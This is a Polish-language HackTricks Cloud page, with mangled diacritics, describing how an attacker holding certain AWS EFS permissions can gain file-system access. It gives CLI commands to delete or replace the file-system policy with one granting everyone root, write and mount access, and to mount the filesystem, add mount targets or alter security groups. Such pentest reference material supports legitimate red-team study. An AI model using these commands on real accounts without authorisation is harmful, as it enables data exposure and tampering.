# AWS - EFS Przywileje

<details>

<summary><strong>Dowiedz si, jak hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## EFS

Wicej **informacji na temat EFS** znajdziesz w:

{% content-ref url="../aws-services/aws-efs-enum.md" %}
[aws-efs-enum.md](../aws-services/aws-efs-enum.md)
{% endcontent-ref %}

Pamitaj, 偶e aby zamontowa EFS, musisz znajdowa si w podsieci, w kt贸rej EFS jest wystawiony i mie do niego dostp (grupy zabezpiecze). Jeli tak si dzieje, domylnie zawsze bdziesz m贸g go zamontowa, jednak jeli jest chroniony przez polityki IAM, musisz mie dodatkowe uprawnienia wymienione tutaj, aby uzyska do niego dostp.

### `elasticfilesystem:DeleteFileSystemPolicy`|`elasticfilesystem:PutFileSystemPolicy`

Z dowolnym z tych uprawnie atakujcy mo偶e **zmieni polityk systemu plik贸w**, aby da ci do niego dostp lub po prostu **usun go**, aby przyzna **domylny dostp**.

Aby usun polityk:
```bash
aws efs delete-file-system-policy \
--file-system-id <value>
```
Aby to zmieni:
```json
aws efs put-file-system-policy --file-system-id <fs-id> --policy file:///tmp/policy.json

// Give everyone trying to mount it read, write and root access
// policy.json:
{
"Version": "2012-10-17",
"Id": "efs-policy-wizard-059944c6-35e7-4ba0-8e40-6f05302d5763",
"Statement": [
{
"Sid": "efs-statement-2161b2bd-7c59-49d7-9fee-6ea8903e6603",
"Effect": "Allow",
"Principal": {
"AWS": "*"
},
"Action": [
"elasticfilesystem:ClientRootAccess",
"elasticfilesystem:ClientWrite",
"elasticfilesystem:ClientMount"
],
"Condition": {
"Bool": {
"elasticfilesystem:AccessedViaMountTarget": "true"
}
}
}
]
}
```
### `elasticfilesystem:ClientMount|(elasticfilesystem:ClientRootAccess)|(elasticfilesystem:ClientWrite)`

Z tym uprawnieniem atakujcy bdzie w stanie **zamontowa EFS**. Jeli uprawnienie do zapisu nie jest domylnie udzielane wszystkim, kt贸rzy mog zamontowa EFS, bdzie mia tylko **dostp do odczytu**.
```bash
sudo mkdir /efs
sudo mount -t efs -o tls,iam  <file-system-id/EFS DNS name>:/ /efs/
```
Dodatkowe uprawnienia `elasticfilesystem:ClientRootAccess` i `elasticfilesystem:ClientWrite` mog by wykorzystane do **zapisywania** w systemie plik贸w po zamontowaniu go oraz do **uzyskania dostpu** do tego systemu plik贸w **jako root**.

**Potencjalne skutki:** Porednie podniesienie uprawnie poprzez zlokalizowanie poufnych informacji w systemie plik贸w.

### `elasticfilesystem:CreateMountTarget`

Jeli atakujcy znajduje si w **podsieci**, w kt贸rej **nie istnieje 偶aden punkt montowania** EFS, mo偶e po prostu **utworzy taki punkt w swojej podsieci** przy u偶yciu tych uprawnie:
```bash
# You need to indicate security groups that will grant the user access to port 2049
aws efs create-mount-target --file-system-id <fs-id> \
--subnet-id <value> \
--security-groups <value>
```
**Potencjalne skutki:** Porednie podniesienie uprawnie poprzez zlokalizowanie wra偶liwych informacji w systemie plik贸w.

### `elasticfilesystem:ModifyMountTargetSecurityGroups`

W sytuacji, gdy atakujcy odkryje, 偶e EFS ma punkt montowania w swojej podsieci, ale **brak grupy zabezpiecze, kt贸ra zezwala na ruch**, mo偶e po prostu **zmieni to, modyfikujc wybrane grupy zabezpiecze**:
```bash
aws efs modify-mount-target-security-groups \
--mount-target-id <value> \
--security-groups <value>
```
**Potencjalne skutki:** Porednie podniesienie uprawnie poprzez zlokalizowanie wra偶liwych informacji w systemie plik贸w.



<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy **reklam swojej firmy w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
